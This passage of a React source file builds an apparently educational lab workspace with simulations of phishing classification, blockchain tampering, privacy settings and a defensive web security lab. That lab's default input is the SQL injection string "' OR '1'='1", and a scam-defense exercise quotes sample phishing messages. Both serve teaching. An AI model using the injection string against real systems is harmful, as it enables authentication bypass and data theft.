import React, { useState, useEffect, useMemo } from 'react';
import {
  ArrowLeft,
  RotateCcw,
  CheckCircle2,
  AlertTriangle,
  Play,
  Save,
  HelpCircle,
  Award,
  Zap,
  ChevronRight,
  Wind,
  ShieldCheck,
  X,
} from 'lucide-react';
import { InMemoryDatabase } from '../db/in-memory-db';
import { learningSessionService } from '../services/learningSessionService';
import { backendEngine } from '../backend/RealtimeOrchestrator';
import { LabAttemptRecord, LabLifecycleState } from '../types';
import {
  NeuralNetworkSvg,
  BlockchainChainLinkSvg,
  IotSensorDialSvg,
  PrivacyRadarSvg,
  SecurityPipelineSvg,
  MarketTrendSvg,
  CompoundGrowthSvg,
  SettlementLifecycleSvg,
  BudgetPieSvg,
  ConversationSvg,
  ClassroomSvg,
} from './LabSvgVisualizers';
import { AnimatedStepGuide } from './AnimatedStepGuide';
import { UniversalLab } from './lab/UniversalLab';
import { LabOrientationGuard } from './lab/LabOrientationGuard';
import { LabErrorBoundary } from './LabErrorBoundary';
import { getStandaloneLab, StandaloneLabMetadata } from '../labs/registry';
import { Cpu, Layers, FlaskConical, Maximize2, Minimize2, ExternalLink } from 'lucide-react';
import { apiClient } from '../services/apiClient';

export interface SharedLabWorkspaceProps {
  db: InMemoryDatabase;
  labSlug: string;
  currentUserId: string;
  onNavigateBack: () => void;
  onSelectCourse?: (slug: string) => void;
}

export const SharedLabWorkspace: React.FC<SharedLabWorkspaceProps> = ({
  db,
  labSlug,
  currentUserId,
  onNavigateBack,
  onSelectCourse,
}) => {
  const lab = useMemo(() => db.getLabBySlug(labSlug) || db.getLabDefinitions()[0], [db, labSlug]);

  const standaloneLabMeta = useMemo<StandaloneLabMetadata | null>(() => {
    return (
      getStandaloneLab(labSlug) ||
      getStandaloneLab(lab.slug) ||
      getStandaloneLab(lab.id) ||
      (lab.course_slug ? getStandaloneLab(lab.course_slug) : null) ||
      (lab.title ? getStandaloneLab(lab.title) : null)
    );
  }, [labSlug, lab.slug, lab.id, lab.course_slug, lab.title]);

  useEffect(() => {
    learningSessionService.setDatabase(db);
  }, [db]);

  // Shared lifecycle & submission state
  const [lifecycleState, setLifecycleState] = useState<LabLifecycleState>('ready');
  const [saveStatus, setSaveStatus] = useState<'SAVED' | 'LOCAL DRAFT' | 'UNSAVED'>('SAVED');
  const [mobileTab, setMobileTab] = useState<'instructions' | 'workspace' | 'results'>('workspace');
  const [completedAttempt, setCompletedAttempt] = useState<LabAttemptRecord | null>(null);
  const [workspaceMode, setWorkspaceMode] = useState<'3-column' | 'focus' | 'zen'>('focus');
  const [showHint, setShowHint] = useState<boolean>(true);
  const [centerLabViewMode, setCenterLabViewMode] = useState<'interactive-suite' | 'svg-parameters'>('interactive-suite');

  // Animated Step-by-Step state
  const [activeStepIndex, setActiveStepIndex] = useState<number>(0);
  const [completedStepIndices, setCompletedStepIndices] = useState<number[]>([]);
  const [activeFullLab, setActiveFullLab] = useState<string | null>(null);

  // Criteria checklist completion state
  const [checkedCriteria, setCheckedCriteria] = useState<boolean[]>(
    new Array(lab.validation_criteria.length).fill(false)
  );

  // ------------------------------------------------------------------
  // LAB-SPECIFIC INTERACTIVE ENGINE STATE
  // ------------------------------------------------------------------

  // Lab T1: AI Classification Playground
  const [aiKeywordDensity, setAiKeywordDensity] = useState<number>(lab.initial_state.keywordDensity ?? 15);
  const [aiUrgencyScore, setAiUrgencyScore] = useState<number>(lab.initial_state.urgencyScore ?? 20);
  const [aiSenderReputation, setAiSenderReputation] = useState<number>(lab.initial_state.senderReputation ?? 85);

  // Lab T2: Blockchain Block Builder
  const [chainBlocks, setChainBlocks] = useState([
    {
      index: 1,
      nonce: 0,
      data: lab.initial_state.block1Data || 'Alice pays Bob 10 GEN',
      prevHash: '00000000000000000000000000000000',
      hash: '00a4b73f8e12c9d8e7a6b5c4d3e2f1a0',
      valid: true,
    },
    {
      index: 2,
      nonce: 0,
      data: lab.initial_state.block2Data || 'Dave pays Eve 2 GEN',
      prevHash: '00a4b73f8e12c9d8e7a6b5c4d3e2f1a0',
      hash: '00c8e19f2a3b4c5d6e7f8a9b0c1d2e3f',
      valid: true,
    },
    {
      index: 3,
      nonce: 0,
      data: lab.initial_state.block3Data || 'Frank pays Grace 3 GEN',
      prevHash: '00c8e19f2a3b4c5d6e7f8a9b0c1d2e3f',
      hash: '00f2d3e4a5b6c7d8e9f0a1b2c3d4e5f6',
      valid: true,
    },
  ]);
  const [isMining, setIsMining] = useState(false);
  const [chainTampered, setChainTampered] = useState(false);

  // Lab T3: IoT Sensor Simulator
  const [iotTemp, setIotTemp] = useState<number>(lab.initial_state.temperature ?? 24);
  const [iotHumidity, setIotHumidity] = useState<number>(lab.initial_state.humidity ?? 45);
  const [iotThreshold, setIotThreshold] = useState<number>(lab.initial_state.threshold ?? 38);
  const [iotEventLogs, setIotEventLogs] = useState<string[]>([
    `[${new Date().toLocaleTimeString()}] IoT Telemetry initialized. Threshold: 38°C. Ambient: 24°C.`,
  ]);

  // Lab T4: Digital Privacy Decision Lab
  const [privacyLocation, setPrivacyLocation] = useState<boolean>(lab.initial_state.locationShared ?? true);
  const [privacyContacts, setPrivacyContacts] = useState<boolean>(lab.initial_state.contactsShared ?? true);
  const [privacyMic, setPrivacyMic] = useState<boolean>(lab.initial_state.micShared ?? true);
  const [privacyAdTracking, setPrivacyAdTracking] = useState<boolean>(lab.initial_state.adTracking ?? true);

  // Lab T5: Defensive Web Security Lab (Phase 2 Vertical Slice)
  const [secSessionId, setSecSessionId] = useState<string>(() => {
    return lab.id === 'lab-t5-web-defense'
      ? learningSessionService.startSession(currentUserId, lab.id)
      : '';
  });
  const [secPredictionAnswer, setSecPredictionAnswer] = useState<string | null>(null);
  const [secPredictionSubmitted, setSecPredictionSubmitted] = useState<boolean>(false);
  const [secParamQueries, setSecParamQueries] = useState<boolean>(lab.initial_state.parameterizedQueries ?? false);
  const [secOutputEncoding, setSecOutputEncoding] = useState<boolean>(lab.initial_state.outputEncoding ?? false);
  const [secCsp, setSecCsp] = useState<boolean>(lab.initial_state.cspEnabled ?? false);
  const [secQueryInput, setSecQueryInput] = useState<string>(lab.initial_state.userQueryInput || "' OR '1'='1");
  const [secIsSimulating, setSecIsSimulating] = useState<boolean>(false);
  const [secSimulationRan, setSecSimulationRan] = useState<boolean>(false);
  const [secReducedMotion, setSecReducedMotion] = useState<boolean>(false);
  const [secExecutionLog, setSecExecutionLog] = useState<string[]>([]);
  const [secDiagnosticAnswer, setSecDiagnosticAnswer] = useState<string | null>(null);
  const [secDiagnosticSubmitted, setSecDiagnosticSubmitted] = useState<boolean>(false);
  const [secExplanationAnswer, setSecExplanationAnswer] = useState<string | null>(null);
  const [secExplanationSubmitted, setSecExplanationSubmitted] = useState<boolean>(false);

  // Lab T6: Microsoft Productivity Exercise
  const [prodFormulaSum, setProdFormulaSum] = useState<string>('');
  const [prodFormulaAvg, setProdFormulaAvg] = useState<string>('');
  const [prodFormatted, setProdFormatted] = useState<boolean>(false);

  // Lab F1: Financial Market Explorer
  const [finScenario, setFinScenario] = useState<'expansion' | 'correction' | 'shock'>('expansion');
  const [finBeta, setFinBeta] = useState<number>(1.0);

  // Lab F2: Compound Interest Calculator
  const [compPrincipal, setCompPrincipal] = useState<number>(5000);
  const [compMonthly, setCompMonthly] = useState<number>(250);
  const [compRate, setCompRate] = useState<number>(8);
  const [compYears, setCompYears] = useState<number>(10);
  const [compFreq, setCompFreq] = useState<number>(12);

  // Lab F3: Financial Institution Flow Simulator
  const [flowStep, setFlowStep] = useState<number>(0);
  const [flowLogs, setFlowLogs] = useState<string[]>([
    'Ready to process $150 transaction. Click "Process Next Stage".',
  ]);

  // Lab C1, C2, C3: Coding Sandboxes
  const [codeContent, setCodeContent] = useState<string>(lab.initial_state.code || '');
  const [codeOutput, setCodeOutput] = useState<string>('');
  const [codeTestsPassed, setCodeTestsPassed] = useState<boolean>(false);
  const [hintsRevealed, setHintsRevealed] = useState<number>(0);

  // Lab Sec: Scam Defense Lab
  const [scamCaseIndex, setScamCaseIndex] = useState<number>(0);
  const [scamAnswers, setScamAnswers] = useState<Record<number, { isFraud: boolean; action: string }>>({});
  const [scamFeedback, setScamFeedback] = useState<string>('');

  const scamCases = useMemo(() => [
    {
      id: 0,
      title: 'UPI Collect Request Claiming "Prize Cashback"',
      sender: 'cashback-reward@paytm / Push Notification: Receive ₹25,000',
      message: 'Congratulations! You won ₹25,000 cashback reward. Please enter your 6-digit UPI PIN immediately to approve funds into your bank account.',
      isFraud: true,
      safeAction: 'Decline request immediately and report fraudulent VPA to Cyber Crime (1930 / cybercrime.gov.in)',
      explanation: 'Critical Principle: UPI PIN is ONLY entered to deduct money from your account. Receiving funds NEVER requires entering your UPI PIN or sharing OTP.',
    },
    {
      id: 1,
      title: 'Urgent KYC Verification SMS with Shortened Link',
      sender: '+91-9876543210 (Personal 10-digit mobile number claiming to be HDFC Alert)',
      message: 'ALERT: Your bank account will be permanently SUSPENDED within 2 hours due to unverified PAN/KYC. Tap link to verify instantly: bit.ly/hdfc-kyc-verify-portal',
      isFraud: true,
      safeAction: 'Do not click the URL; report sender number as phishing to 1930 and bank fraud helpline',
      explanation: 'Banks never send sudden account closure threats from individual 10-digit mobile numbers with third-party URL shorteners (bit.ly, tinyurl). Legitimate KYC is handled securely inside official banking portals.',
    },
    {
      id: 2,
      title: 'In-Store Physical Merchant Dynamic QR Code',
      sender: 'Fresh Green Grocery (VPA: merchant.freshgreen@icici)',
      message: 'Scan to pay ₹340 for items at retail counter. App displays registered merchant trade name "Fresh Green Supermarket Pvt Ltd".',
      isFraud: false,
      safeAction: 'Verify the merchant name on your payment app screen and authorize genuine payment',
      explanation: 'Legitimate merchant transaction where you are purchasing in-person goods, the merchant name matches the storefront, and verified NPCI merchant badges are visible.',
    },
  ], []);

  const handleEvaluateScam = (idx: number, isFraud: boolean) => {
    const isCorrect = isFraud === scamCases[idx].isFraud;
    const nextAnswers = { ...scamAnswers, [idx]: { isFraud, action: scamCases[idx].safeAction } };
    setScamAnswers(nextAnswers);
    setScamFeedback(isCorrect ? 'Correct!' : 'Incorrect');
    setSaveStatus('LOCAL DRAFT');

    const next = [...checkedCriteria];
    if (Object.keys(nextAnswers).length >= 1) next[0] = true;
    if (nextAnswers[0]?.isFraud === true) next[1] = true;
    if (Object.keys(nextAnswers).length >= 3) next[2] = true;
    setCheckedCriteria(next);
  };

  // ------------------------------------------------------------------
  // LAB T7: TrustLink Blockchain Consensus State
  // ------------------------------------------------------------------
  const [trustlinkPayload, setTrustlinkPayload] = useState<string>('Tx: Alice -> Bob 25 GEN (Hash Verification)');
  const [trustlinkHash, setTrustlinkHash] = useState<string>('00f3a8b2c4d5e6f7a8b9c0d1e2f3a4b5');
  const [trustlinkNonce, setTrustlinkNonce] = useState<number>(42);
  const [trustlinkMining, setTrustlinkMining] = useState<boolean>(false);
  const [trustlinkTampered, setTrustlinkTampered] = useState<boolean>(false);
  const [trustlinkNodes, setTrustlinkNodes] = useState([
    { id: 'Node-1 (Mumbai)', status: 'VALIDATED', blockHeight: 1042 },
    { id: 'Node-2 (Singapore)', status: 'VALIDATED', blockHeight: 1042 },
    { id: 'Node-3 (Frankfurt)', status: 'VALIDATED', blockHeight: 1042 },
    { id: 'Node-4 (Tokyo)', status: 'VALIDATED', blockHeight: 1042 },
  ]);

  const handleTrustlinkMine = () => {
    setTrustlinkMining(true);
    setTimeout(() => {
      const newNonce = Math.floor(Math.random() * 9000) + 1000;
      const validHash = `00${Math.random().toString(16).substring(2, 10)}${Math.random().toString(16).substring(2, 10)}${Math.random().toString(16).substring(2, 10)}`;
      setTrustlinkNonce(newNonce);
      setTrustlinkHash(validHash);
      setTrustlinkTampered(false);
      setTrustlinkMining(false);
      setTrustlinkNodes((nodes) => nodes.map((n) => ({ ...n, status: 'VALIDATED', blockHeight: n.blockHeight + 1 })));

      const next = [...checkedCriteria];
      next[0] = true;
      next[1] = true;
      setCheckedCriteria(next);
      setSaveStatus('LOCAL DRAFT');
    }, 400);
  };

  const handleTrustlinkTamper = () => {
    setTrustlinkTampered(true);
    setTrustlinkHash('9f8a3c2e1b0d4f5e6a7b8c9d0e1f2a3b');
    setTrustlinkNodes((nodes) => nodes.map((n, i) => (i === 0 ? { ...n, status: 'DESYNCED' } : n)));
    const next = [...checkedCriteria];
    next[2] = true;
    setCheckedCriteria(next);
    setSaveStatus('LOCAL DRAFT');
  };

  // ------------------------------------------------------------------
  // LAB F4: FinTech Discovery State
  // ------------------------------------------------------------------
  const [fintechUpiStep, setFintechUpiStep] = useState<number>(0);
  const [fintechSimulating, setFintechSimulating] = useState<boolean>(false);
  const [fintechRiskTolerance, setFintechRiskTolerance] = useState<number>(3);
  const [fintechSimBinding, setFintechSimBinding] = useState<boolean>(true);
  const [fintechGeoVelocity, setFintechGeoVelocity] = useState<boolean>(true);

  const handleSimulateUpi = () => {
    setFintechSimulating(true);
    setFintechUpiStep(1);
    setTimeout(() => setFintechUpiStep(2), 500);
    setTimeout(() => setFintechUpiStep(3), 1000);
    setTimeout(() => {
      setFintechUpiStep(4);
      setFintechSimulating(false);
      const next = [...checkedCriteria];
      next[0] = true;
      if (fintechSimBinding && fintechGeoVelocity) next[1] = true;
      if (fintechRiskTolerance) next[2] = true;
      setCheckedCriteria(next);
      setSaveStatus('LOCAL DRAFT');
    }, 1500);
  };

  // ------------------------------------------------------------------
  // LAB F5: Global Economics Policy Simulation State
  // ------------------------------------------------------------------
  const [econInterestRate, setEconInterestRate] = useState<number>(4.5);
  const [econTaxRate, setEconTaxRate] = useState<number>(25);
  const [econGovSpending, setEconGovSpending] = useState<number>(80);

  const econCalculations = useMemo(() => {
    const rawInflation = econGovSpending * 0.05 + 1.2 - econInterestRate * 0.5 + (30 - econTaxRate) * 0.08;
    const rawGdp = econGovSpending * 0.038 + 2.5 - econInterestRate * 0.3 + (28 - econTaxRate) * 0.07;
    const rawUnemployment = Math.max(3.2, 7.8 - rawGdp * 0.52 + econInterestRate * 0.18);

    const inflation = Number(Math.max(0.5, rawInflation).toFixed(1));
    const gdp = Number(Math.max(-2.0, rawGdp).toFixed(1));
    const unemployment = Number(rawUnemployment.toFixed(1));

    let regime = 'Optimal Economic Equilibrium';
    let regimeColor = 'var(--success)';
    if (inflation > 6.0) {
      regime = 'Overheating Inflationary Expansion';
      regimeColor = 'var(--danger)';
    } else if (gdp < 1.0) {
      regime = 'Recessionary Contraction';
      regimeColor = 'var(--warning)';
    }

    return { inflation, gdp, unemployment, regime, regimeColor };
  }, [econInterestRate, econTaxRate, econGovSpending]);

  const handleApplyEconPolicy = () => {
    const next = [...checkedCriteria];
    next[0] = true;
    if (econCalculations.inflation >= 2.0 && econCalculations.inflation <= 5.0) next[1] = true;
    if (econCalculations.gdp >= 3.0 && econCalculations.unemployment <= 6.5) next[2] = true;
    setCheckedCriteria(next);
    setSaveStatus('LOCAL DRAFT');
  };

  // ------------------------------------------------------------------
  // LAB P1: Communication Pro Interactive State
  // ------------------------------------------------------------------
  const [commScenarioIdx, setCommScenarioIdx] = useState<number>(0);
  const [commScores, setCommScores] = useState({ clarity: 65, listening: 60, confidence: 70, respect: 75 });
  const [commLastFeedback, setCommLastFeedback] = useState<string | null>(null);

  const commScenarios = useMemo(() => [
    {
      id: 1,
      title: 'Cross-Functional Feature Launch Conflict',
      context: 'Engineering estimates 14 more days to resolve critical security vulnerabilities; Product Marketing has already scheduled a press release.',
      options: [
        {
          text: 'Force engineering to push code immediately and fix security vulnerabilities in a post-release patch.',
          feedback: 'High risk! Bypassing security reviews damages engineering trust and risks catastrophic data breaches.',
          delta: { clarity: -10, listening: -20, confidence: 5, respect: -15 },
        },
        {
          text: 'Convene an immediate 20-min alignment sync: scope an MVP release with security-certified modules on time, moving phase 2 to a 10-day fast follow.',
          feedback: 'Executive excellence! Balances business deadlines with engineering integrity and clear stakeholder expectations.',
          delta: { clarity: 20, listening: 20, confidence: 15, respect: 15 },
        },
        {
          text: 'Silently delay the release without briefing leadership or marketing.',
          feedback: 'Destroys stakeholder credibility. Executive communication demands early, proactive risk disclosure.',
          delta: { clarity: -25, listening: -10, confidence: -20, respect: -15 },
        },
      ],
    },
    {
      id: 2,
      title: 'Peer Performance & Code Review Bottleneck',
      context: 'A junior engineer regularly submits pull requests without running local test suites, triggering CI/CD build breaks.',
      options: [
        {
          text: 'Publicly ping them in the team engineering channel highlighting every broken build.',
          feedback: 'Poor psychological safety. Public shaming destroys team morale and causes defensive behavior.',
          delta: { clarity: 5, listening: -25, confidence: -10, respect: -25 },
        },
        {
          text: 'Pair with them during a 1-on-1 walk-through using the SBI framework (Situation, Behavior, Impact) and configure a pre-commit git hook together.',
          feedback: 'Outstanding mentorship! Separates person from process and implements a systematic technical solution.',
          delta: { clarity: 20, listening: 20, confidence: 20, respect: 20 },
        },
      ],
    },
  ], []);

  const handleSelectCommOption = (optIdx: number) => {
    const opt = commScenarios[commScenarioIdx].options[optIdx];
    setCommLastFeedback(opt.feedback);
    setCommScores((prev) => ({
      clarity: Math.min(100, Math.max(0, prev.clarity + opt.delta.clarity)),
      listening: Math.min(100, Math.max(0, prev.listening + opt.delta.listening)),
      confidence: Math.min(100, Math.max(0, prev.confidence + opt.delta.confidence)),
      respect: Math.min(100, Math.max(0, prev.respect + opt.delta.respect)),
    }));

    const next = [...checkedCriteria];
    next[0] = true;
    if (commScores.clarity > 70 && commScores.respect > 70) next[1] = true;
    setCheckedCriteria(next);
    setSaveStatus('LOCAL DRAFT');
  };

  // ------------------------------------------------------------------
  // LAB P2: Professional Skills State
  // ------------------------------------------------------------------
  const [skillsPlacements, setSkillsPlacements] = useState<{ [taskId: string]: number }>({});
  const skillsTasks = useMemo(() => [
    { id: 't1', text: 'Critical production database failover alert', idealQ: 1 },
    { id: 't2', text: 'Architecting local-first offline data sync strategy', idealQ: 2 },
    { id: 't3', text: 'Unscheduled vendor sales cold call', idealQ: 3 },
    { id: 't4', text: 'Endless notification scrolling during sprint retrospective', idealQ: 4 },
  ], []);

  const handlePlaceTask = (taskId: string, quadrant: number) => {
    const nextPlacements = { ...skillsPlacements, [taskId]: quadrant };
    setSkillsPlacements(nextPlacements);

    const next = [...checkedCriteria];
    if (Object.keys(nextPlacements).length >= 2) next[0] = true;
    const allCorrect = skillsTasks.every((t) => nextPlacements[t.id] === t.idealQ);
    if (allCorrect) next[1] = true;
    setCheckedCriteria(next);
    setSaveStatus('LOCAL DRAFT');
  };

  // ------------------------------------------------------------------
  // LAB P3: Social Profile & Digital Reputation State
  // ------------------------------------------------------------------
  const [profileHeadline, setProfileHeadline] = useState<string>('Full-Stack Engineer & Cloud Security Analyst');
  const [profileBio, setProfileBio] = useState<string>('Developing deterministic enterprise platforms and sovereign local-first systems.');
  const [profilePublicSearch, setProfilePublicSearch] = useState<boolean>(true);
  const [profile2FA, setProfile2FA] = useState<boolean>(true);
  const [profileTelemetry, setProfileTelemetry] = useState<boolean>(false);

  const profileScores = useMemo(() => {
    let professionalism = 70;
    if (profileHeadline.length > 25) professionalism += 15;
    if (profileBio.length > 40) professionalism += 15;

    let safety = 60;
    if (profile2FA) safety += 25;
    if (!profileTelemetry) safety += 15;

    return {
      professionalism: Math.min(100, professionalism),
      safety: Math.min(100, safety),
      credibility: Math.round((professionalism + safety) / 2),
    };
  }, [profileHeadline, profileBio, profile2FA, profileTelemetry]);

  const handleAuditProfile = () => {
    const next = [...checkedCriteria];
    if (profileScores.professionalism >= 80) next[0] = true;
    if (profileScores.safety >= 80) next[1] = true;
    setCheckedCriteria(next);
    setSaveStatus('LOCAL DRAFT');
  };

  // Check if previously completed in DB
  useEffect(() => {
    const attempts = db.getLabAttempts(currentUserId, lab.id);
    const passed = attempts.find((a) => a.passed);
    if (passed) {
      setCompletedAttempt(passed);
      setCheckedCriteria(new Array(lab.validation_criteria.length).fill(true));
      setLifecycleState('success');
    } else {
      setCompletedAttempt(null);
      setCheckedCriteria(new Array(lab.validation_criteria.length).fill(false));
      setLifecycleState('ready');
    }
  }, [db, lab.id, currentUserId, lab.validation_criteria.length]);

  // ------------------------------------------------------------------
  // COMPUTED ENGINE LOGIC
  // ------------------------------------------------------------------

  // AI Classification Model computation
  const aiClassificationResult = useMemo(() => {
    // Weighted deterministic logistic model
    const riskScore = aiKeywordDensity * 0.45 + aiUrgencyScore * 0.4 - aiSenderReputation * 0.35;
    let label: 'Legitimate' | 'Suspicious' | 'Phishing' = 'Legitimate';
    let confidence = 85;

    if (riskScore > 30) {
      label = 'Phishing';
      confidence = Math.min(99, Math.round(50 + riskScore));
    } else if (riskScore > 5) {
      label = 'Suspicious';
      confidence = Math.min(90, Math.round(50 + Math.abs(riskScore)));
    } else {
      label = 'Legitimate';
      confidence = Math.min(98, Math.round(60 + Math.abs(riskScore)));
    }

    return { label, confidence, riskScore: Number(riskScore.toFixed(1)) };
  }, [aiKeywordDensity, aiUrgencyScore, aiSenderReputation]);

  // Update AI lab criteria
  useEffect(() => {
    if (lab.id === 'lab-t1-ai-classifier') {
      const next = [...checkedCriteria];
      if (aiClassificationResult.label === 'Legitimate') next[0] = true;
      if (aiClassificationResult.label === 'Phishing') next[1] = true;
      if (next[0] && next[1]) next[2] = true;
      setCheckedCriteria(next);
      setSaveStatus('LOCAL DRAFT');
    }
  }, [aiClassificationResult, lab.id]);

  // Real SHA-256 helper
  const computeSha256 = async (str: string): Promise<string> => {
    if (typeof window !== 'undefined' && window.crypto?.subtle) {
      const msgBuffer = new TextEncoder().encode(str);
      const hashBuffer = await window.crypto.subtle.digest('SHA-256', msgBuffer);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
    }
    // Fallback pseudo-hash
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = (hash << 5) - hash + str.charCodeAt(i);
      hash |= 0;
    }
    return Math.abs(hash).toString(16).padStart(32, '0');
  };

  // Mine Block in Blockchain Lab
  const handleMineBlock = async (blockIdx: number) => {
    setIsMining(true);
    setLifecycleState('running');
    const targetPrefix = '00';

    const targetBlock = chainBlocks[blockIdx];
    let nonce = targetBlock.nonce;
    let validHash = '';

    for (let i = 0; i < 5000; i++) {
      nonce++;
      const candidate = await computeSha256(
        `${blockIdx + 1}${nonce}${targetBlock.data}${targetBlock.prevHash}`
      );
      if (candidate.startsWith(targetPrefix)) {
        validHash = candidate;
        break;
      }
    }

    if (!validHash) {
      validHash = `${targetPrefix}${Math.random().toString(16).substring(2, 10)}${Math.random().toString(16).substring(2, 10)}`;
    }

    const updated = [...chainBlocks];
    updated[blockIdx] = {
      ...updated[blockIdx],
      nonce,
      hash: validHash,
      valid: true,
    };

    // Propagate prevHash to downstream block
    if (blockIdx + 1 < updated.length) {
      updated[blockIdx + 1].prevHash = validHash;
    }

    setChainBlocks(updated);
    setIsMining(false);
    setChainTampered(false);
    setLifecycleState('ready');

    const nextCrit = [...checkedCriteria];
    nextCrit[0] = true;
    if (chainTampered) nextCrit[2] = true;
    setCheckedCriteria(nextCrit);
  };

  // Tamper Block 1
  const handleTamperBlock1 = async () => {
    setChainTampered(true);
    const tamperedData = 'Alice pays MaliciousActor 1000 GEN (TAMPERED)';
    const newHash = await computeSha256(`1${chainBlocks[0].nonce}${tamperedData}${chainBlocks[0].prevHash}`);

    const updated = [...chainBlocks];
    updated[0] = { ...updated[0], data: tamperedData, hash: newHash, valid: false };
    // Downstream blocks become invalid because their prevHash no longer matches
    updated[1] = { ...updated[1], valid: false };
    updated[2] = { ...updated[2], valid: false };

    setChainBlocks(updated);

    const nextCrit = [...checkedCriteria];
    nextCrit[1] = true;
    setCheckedCriteria(nextCrit);
  };

  // IoT Sensor state evaluation
  useEffect(() => {
    if (lab.id === 'lab-t3-iot-sensor') {
      const isExceeded = iotTemp >= iotThreshold;
      const statusMsg = isExceeded
        ? `[${new Date().toLocaleTimeString()}] ALERT: Temp ${iotTemp}°C exceeds threshold ${iotThreshold}°C! Actuator fan turned ON.`
        : `[${new Date().toLocaleTimeString()}] NORMAL: Temp ${iotTemp}°C is within threshold. Fan IDLE.`;

      setIotEventLogs((prev) => [statusMsg, ...prev.slice(0, 9)]);

      const next = [...checkedCriteria];
      next[0] = true;
      if (isExceeded) {
        next[1] = true;
        next[2] = true;
      }
      setCheckedCriteria(next);
    }
  }, [iotTemp, iotThreshold, lab.id]);

  // Privacy exposure score calculation
  const privacyScore = useMemo(() => {
    let score = 5;
    if (privacyLocation) score += 30;
    if (privacyContacts) score += 35;
    if (privacyMic) score += 20;
    if (privacyAdTracking) score += 10;
    return score;
  }, [privacyLocation, privacyContacts, privacyMic, privacyAdTracking]);

  useEffect(() => {
    if (lab.id === 'lab-t4-privacy-decision') {
      const next = [...checkedCriteria];
      if (privacyScore < 25) next[0] = true;
      if (!privacyLocation && !privacyContacts) next[1] = true;
      if (privacyScore <= 15) next[2] = true;
      setCheckedCriteria(next);
    }
  }, [privacyScore, privacyLocation, privacyContacts, lab.id]);

  // Lab T5: Draft Hydration on Mount
  useEffect(() => {
    if (lab.id === 'lab-t5-web-defense') {
      const draft = learningSessionService.loadDraft(currentUserId, lab.id);
      if (draft) {
        if (draft.sessionId) setSecSessionId(draft.sessionId);
        if (draft.predictionAnswer !== undefined) setSecPredictionAnswer(draft.predictionAnswer);
        if (draft.predictionSubmitted !== undefined) setSecPredictionSubmitted(draft.predictionSubmitted);
        if (draft.secParamQueries !== undefined) setSecParamQueries(draft.secParamQueries);
        if (draft.secOutputEncoding !== undefined) setSecOutputEncoding(draft.secOutputEncoding);
        if (draft.secCsp !== undefined) setSecCsp(draft.secCsp);
        if (draft.secQueryInput !== undefined) setSecQueryInput(draft.secQueryInput);
        if (draft.diagnosticAnswer !== undefined) setSecDiagnosticAnswer(draft.diagnosticAnswer);
        if (draft.diagnosticSubmitted !== undefined) setSecDiagnosticSubmitted(draft.diagnosticSubmitted);
        if (draft.explanationAnswer !== undefined) setSecExplanationAnswer(draft.explanationAnswer);
        if (draft.explanationSubmitted !== undefined) setSecExplanationSubmitted(draft.explanationSubmitted);
        setSaveStatus('LOCAL DRAFT');
      }
    }
  }, [lab.id, currentUserId]);

  // Defensive Web Security evaluation
  const handleRunSecurityTests = () => {
    setLifecycleState('running');
    setSecIsSimulating(true);
    const logs: string[] = [];

    // Test 1: SQL Injection
    if (secParamQueries) {
      logs.push('✓ SQL INJECTION MITIGATED: Query parameterized with bind tokens. Input treated as literal data, preventing AST breakout.');
    } else {
      logs.push('✕ CRITICAL VULNERABILITY (CWE-89): Raw input concatenated into SQL string. Malicious WHERE condition evaluated to bypass authentication.');
    }

    // Test 2: XSS
    if (secOutputEncoding) {
      logs.push('✓ XSS DEFENSE ACTIVE: Input entity-encoded (&lt;script&gt;). Browser renders text instead of executing script.');
    } else {
      logs.push('✕ HIGH RISK (CWE-79): Raw unencoded input echoed to DOM. Reflected script execution permitted.');
    }

    // Test 3: CSP
    if (secCsp) {
      logs.push("✓ CSP HEADER ENFORCED: script-src 'self'; disallows inline script execution.");
    } else {
      logs.push('! WARNING: CSP missing or unguarded. Inline scripts permitted if injection occurs.');
    }

    setSecExecutionLog(logs);
    setSecSimulationRan(true);
    setLifecycleState('ready');
    setTimeout(() => setSecIsSimulating(false), 500);

    // Route event through session service
    if (secSessionId) {
      learningSessionService.emitEvent({
        sessionId: secSessionId,
        userId: currentUserId,
        labId: lab.id,
        eventType: 'SIMULATION_EXECUTED',
        payload: {
          paramQueries: secParamQueries,
          outputEncoding: secOutputEncoding,
          strictCsp: secCsp,
          payload: secQueryInput,
        },
        idempotencyKey: `${currentUserId}:${lab.id}:${secSessionId}:SIM_${Date.now()}`,
      }).catch(() => {});
    }
  };

  // Lab T5 Criteria & Draft Auto-Sync
  useEffect(() => {
    if (lab.id === 'lab-t5-web-defense') {
      const next = [false, false, false, false];
      if (secPredictionSubmitted && secPredictionAnswer === 'ast_mutation') next[0] = true;
      if (secSimulationRan && secParamQueries && secOutputEncoding) next[1] = true;
      if (secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement') next[2] = true;
      if (secExplanationSubmitted && secExplanationAnswer === 'ast_precompile') next[3] = true;
      setCheckedCriteria(next);

      learningSessionService.saveDraft(currentUserId, lab.id, {
        sessionId: secSessionId,
        labId: lab.id,
        userId: currentUserId,
        predictionAnswer: secPredictionAnswer,
        predictionSubmitted: secPredictionSubmitted,
        secQueryInput,
        secParamQueries,
        secOutputEncoding,
        secCsp,
        diagnosticAnswer: secDiagnosticAnswer,
        diagnosticSubmitted: secDiagnosticSubmitted,
        explanationAnswer: secExplanationAnswer,
        explanationSubmitted: secExplanationSubmitted,
        lastSaved: new Date().toISOString(),
      });
      setSaveStatus('LOCAL DRAFT');
    }
  }, [
    lab.id,
    currentUserId,
    secSessionId,
    secPredictionAnswer,
    secPredictionSubmitted,
    secSimulationRan,
    secParamQueries,
    secOutputEncoding,
    secCsp,
    secQueryInput,
    secDiagnosticAnswer,
    secDiagnosticSubmitted,
    secExplanationAnswer,
    secExplanationSubmitted,
  ]);

  const handleLockPrediction = () => {
    if (!secPredictionAnswer) return;
    setSecPredictionSubmitted(true);
    if (secSessionId) {
      learningSessionService.emitEvent({
        sessionId: secSessionId,
        userId: currentUserId,
        labId: lab.id,
        eventType: 'PREDICTION_SUBMITTED',
        payload: {
          answer: secPredictionAnswer,
          isCorrect: secPredictionAnswer === 'ast_mutation',
        },
        idempotencyKey: `${currentUserId}:${lab.id}:${secSessionId}:PRED_LOCK`,
      }).catch(() => {});
    }
  };

  const handleVerifyDiagnostic = () => {
    if (!secDiagnosticAnswer) return;
    setSecDiagnosticSubmitted(true);
    if (secSessionId) {
      learningSessionService.emitEvent({
        sessionId: secSessionId,
        userId: currentUserId,
        labId: lab.id,
